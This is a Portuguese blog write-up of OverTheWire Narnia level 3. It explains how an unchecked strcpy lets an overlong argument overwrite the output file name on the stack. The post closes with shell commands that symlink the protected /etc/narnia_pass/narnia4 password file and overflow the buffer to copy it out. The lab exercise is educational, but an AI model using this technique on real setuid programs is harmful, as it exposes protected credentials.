---
layout: default
title: Level 3 - Corrompendo variáveis locais na stack [OverTheWire CTF – Narnia] write-up
date: 2017-01-07 15:55
author: brennords
comments: true
categories: [CTFs]
---
<ul>
    <li><a href="https://brenn0.wordpress.com/2016/12/06/level-0-overthewire-ctf-narnia-write-up/">Level 0</a></li>
    <li><a href="https://brenn0.wordpress.com/2016/12/13/level-1-overthewire-ctf-narnia-write-up/">Level 1</a></li>
    <li><a href="https://brenn0.wordpress.com/2017/01/03/level-2-overthewire-ctf-narnia-write-up/">Level 2</a></li>
</ul>

Dando seguimento a série de write ups do <a href="http://overthewire.org/wargames/narnia/">Narnia</a>, chegou a hora de exploitar o level3.

```narnia3@melinda:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
```

Ele pega o primeiro argumento como o caminho para um arquivo e envia o conteúdo desse arquivo para <a href="https://pt.wikipedia.org/wiki//dev/null">/dev/null</a>? Não parece um programa muito útil.

Antes de qualquer análise, pensei que seria óbvio que, por ter permissões de narnia4, narnia3, de alguma forma, iria ler o conteúdo de <strong>/etc/narnia_pass/narnia4</strong> e nos passar ao invés de jogar em /dev/null e não ajudar ninguém.

Mas como o código fonte está bem perto de nós, vamos observa-lo e descobrir se há alguma forma de explorar esta habilidade de leitura de arquivos.

https://gist.github.com/anonymous/2978f3a6b1db2a77494d01c58de34384

Nada complexo. Mas vamos por partes.

```
int  ifd,  ofd;
char ofile[16] = /dev/null;
char ifile[32];
char buf[32];
```

As duas primeiras variáveis do tipo inteiro declaradas em main são <strong>ifd</strong> e <strong>ofd</strong>. Como o sugestivo nome indica, servem como <a href="https://en.wikipedia.org/wiki/File_descriptor">file descriptors</a> tanto para o arquivo de entrada, quanto para o de saída.

Na segunda linha vemos um vetor de caracteres chamado <strong>o</strong><del datetime="2017-01-07T14:35:02+00:00">utput</del><strong>file</strong> que guarda o valor "/dev/null". É bem óbvio a razão para a existência do mesmo.

Na terceira, <strong>i</strong><del datetime="2017-01-07T14:35:02+00:00">nput</del><strong>file</strong> é mais um vetor de caracteres, com espaço para 32 dos mesmos, que não é inicializado. É nessa variável que mais tarde o código guardará o nome do arquivo de entrada, ou seja, nosso argumento para o programa.

A sexta e última variável declarada na última linha do código acima é outro vetor de caracteres chamado <strong>buf</strong>. Ele vai ser usado para guardar o conteúdo do arquivo de entrada e depois escrever este conteúdo no arquivo de saída.

Logo depois das declarações de variáveis, há um simples if que verifica se algum argumento foi passado.

```
    if(argc != 2){
        printf(usage, %s file, will send contents of file 2 /dev/null\n,argv[0]);
        exit(-1);
    }
    ```

A parte seguinte do código usa a função amiga dos buffer overflow e inimiga dos dados guardados na stack, <strong>strcpy</strong>, que sem nenhum cuidado vai copiar argv[1] direto para ifile. E, depois de fazer essa operação perigosa, usa os file descriptors para checar se há permissão de escrita e leitura em ofile, e leitura em ifile.

```
     /* open files */
     strcpy(ifile, argv[1]);
     if((ofd = open(ofile,O_RDWR)) 0 ){
         printf(error opening %s\n, ofile);
         exit(-1);
     }
     if((ifd = open(ifile, O_RDONLY)) 0 ){
         printf(error opening %s\n, ifile);
         exit(-1);
     }```

Para finalizar, a última parte da função lê o ifile e copia o conteúdo para buf e logo depois escreve de buf para ofile. Fechando os arquivos logo depois.

```
    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf(copied contents of %s to a safer place... (%s)\n,ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
    }```

Depois de compreender todo o código, pareceu que para ganhar a flag bastava estourar ifile passando um argumento do mal que executasse /bin/sh assim como foi feito no <a href="https://brenn0.wordpress.com/2017/01/03/level-2-overthewire-ctf-narnia-write-up/">último chall</a>. Sei bem que não faria sentido que dois challs seguidos tivessem a mesma resolução, <a href="https://brenn0.wordpress.com/category/ctfs/over-the-wire/leviathan/">mas já aconteceu coisa parecida antes</a>, então não custava tentar.

Mas essa ideia logo se mostrou impossível assim que mandei um checksec com o binário carregado no gdb aprimorado pelo peda.

```narnia3@melinda:/tmp/2017$ gdb -q /narnia/narnia3
Reading symbols from /narnia/narnia3...(no debugging symbols found)...done.
(gdb) source /usr/local/peda/peda.py
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled```

<blockquote>O bit NX, que deriva da expressão em inglês No eXecute, é uma tecnologia usada em alguns processadores e sistemas operacionais que separa de modo rígido as áreas de memória que podem ser usadas para execução de código daquelas que só podem servir para armazenar dados. Ele é usada com propósitos de segurança.

Uma área da memória que esteja marcada com o atributo NX pode ser usada somente para guardar dados, então quaisquer instruções que estejam nela não serão executadas. A técnica serve para prevenir certos tipos de ataques feitos por malwares, quando o programa malicioso insere instruções na área de dados de outro programa, tentando que elas sejam executadas a partir de lá. Esse tipo de ataque é chamado de buffer overflow.

<a href="https://pt.wikipedia.org/wiki/Bit_NX">https://pt.wikipedia.org/wiki/Bit_NX</a></blockquote>

Isso significa que explorar o espaço da stack para guardar um shellcode e tentar executa-lo não irá funcionar.

E agora?

Em outros write ups já falei sobre a famigerada stack. Se você não faz ideia do que seja, recomendo que leia o write up do <a href="https://brenn0.wordpress.com/2016/12/06/level-0-overthewire-ctf-narnia-write-up/">level 0</a> do próprio narnia que acredito ter conteúdo suficiente para que você me acompanhe. Mas, como sempre faço, vou deixando links pelo meio do post e te dando a ideia de usar o <a href="https://duckduckgo.com/">Google</a> para ir tirando dúvidas.

No ínicio do processo, a função main vai ser executada e jogar suas variáveis na stack:

<img class="size-full wp-image-1410" src="https://brenn0.files.wordpress.com/2017/01/narnia3_1.png" alt="Um lindo desenho." width="147" height="147" />

Como sabemos, as variáveis não inicializadas apenas terão espaço reservado, por isso fiz referência a elas pelo nome e, no caso de ofile, usei seu valor "/dev/null".

E para não ficar apenas com essa abstração horrível em forma de desenho mais horrível ainda, te recomendo <a href="https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames">este link</a> para que entendas bem melhor do que estou e continuarei falando.

Acredito que você se lembre de quando falei de strcpy. Na 22º linha do código do chall, seja lá qual for o tamanho do argumento que passarmos, ele será copiado para o espaço reservado para ifile. E se este argumento tiver mais de 32 caracteres, os dados irão invadir o espaço de ofile (e o que mais vinher depois, como ofd, ifd...).

Sabendo disso você até pode resolver o chall sozinho. Vá lá e só volte aqui para comparar soluções.

<hr />

<hr />

<hr />

<hr />

<hr />

<hr />

<hr />

<hr />

Tendo o poder de corromper o valor de ofile guardado no stack, a primeira ideia é a de modificar esse valor para um arquivo válido e sob nosso controle.

Tomei a liberdade fazer uma pequena alteração do código do chall só para ver isso acontecendo de forma mais prática, observe as inserções na linha 21 e 27:

https://gist.github.com/anonymous/b78a2c589773cd2c2db5034257e38441

Agora compilando e executando:

```suamae@yourbox:~/tmp$ gcc narnia3.c -o narnia3
suamae@yourbox:~/tmp$ ./narnia3 `python -c 'print B*32 + ownded'`
Antes: /dev/null
error opening BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBownded
Depois: ownded```

Exatamente o comportamento esperado.

Exploitation time!

Criei uma pasta em /tmp e dentro dela criei um link simbólico para /etc/narnia_pass/narnia4. O nome desse link era formado pelos 32 B's necessários para preencher todo o espaço de ifile + flag (que é o nome do arquivo que também criei para que o processo escrevesse a flag).

```narnia3@melinda:~$ cd /narnia
narnia3@melinda:/narnia$ mkdir /tmp/rddi
narnia3@melinda:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/rddi/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBflag
narnia3@melinda:/narnia$ cd /tmp/rddi
narnia3@melinda:/tmp/rddi$ touch flag
narnia3@melinda:/tmp/rddi$ /narnia/narnia3 `python -c 'print B*32 + flag'`
copied contents of BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBflag to a safer place... (flag)
narnia3@melinda:/tmp/rddi$ cat flag
c2ljaw==
▒▒▒▒▒4▒▒▒▒_▒▒}0,narnia3@melinda:/tmp/rddi$```
